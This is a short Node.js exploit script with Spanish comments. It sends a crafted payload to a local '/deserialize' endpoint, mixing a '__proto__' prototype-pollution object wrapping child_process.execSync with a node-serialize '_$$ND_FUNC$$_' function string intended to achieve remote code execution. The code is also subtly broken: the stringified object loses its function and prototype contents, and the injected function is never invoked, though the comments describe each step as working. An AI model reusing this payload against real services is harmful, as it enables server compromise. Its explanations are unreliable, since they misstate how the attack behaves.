// Se importa la biblioteca Axios, que se utilizará para realizar la solicitud HTTP POST.
const axios = require('axios');

// Se crea un objeto llamado `maliciousPayload` que tiene una propiedad especial `__proto__`, la cual se usa para agregar propiedades a objetos en JavaScript.
// Se agrega una propiedad llamada `execSync`, la cual es una función que ejecuta comandos en el sistema operativo del servidor y devuelve su resultado.
const maliciousPayload = {
  "__proto__": {
    "execSync": function (command) {
      const output = require('child_process').execSync(command).toString();
      return output;
    }
  }
};

// El objeto `maliciousPayload` se convierte en una cadena JSON para poder enviarlo como datos de la solicitud HTTP.
const serializedPayload = JSON.stringify(maliciousPayload);

// La cadena JSON se modifica para agregar una propiedad llamada `rce`, que es una función que simplemente imprime "RCE" en la consola.
// Para hacer esto, se reemplaza el objeto vacío `{}` en la cadena JSON original con este objeto modificado.
const modifiedPayload = serializedPayload.replace('{}', `{"rce":"_$$ND_FUNC$$_function (){console.log('RCE')}"}`);

// Se utiliza Axios para realizar una solicitud HTTP POST a la URL `http://localhost:3000/deserialize` con los datos de `modifiedPayload` en el cuerpo de la solicitud.
// Si la solicitud se realiza correctamente, la respuesta se registra en la consola. Si hay un error, se registra un mensaje de error en la consola.
axios
  .post('http://localhost:3000/deserialize', { serializedData: modifiedPayload })
  .then((response) => {
    console.log(response.data);
  })
  .catch((error) => {
    console.error(error);
  });
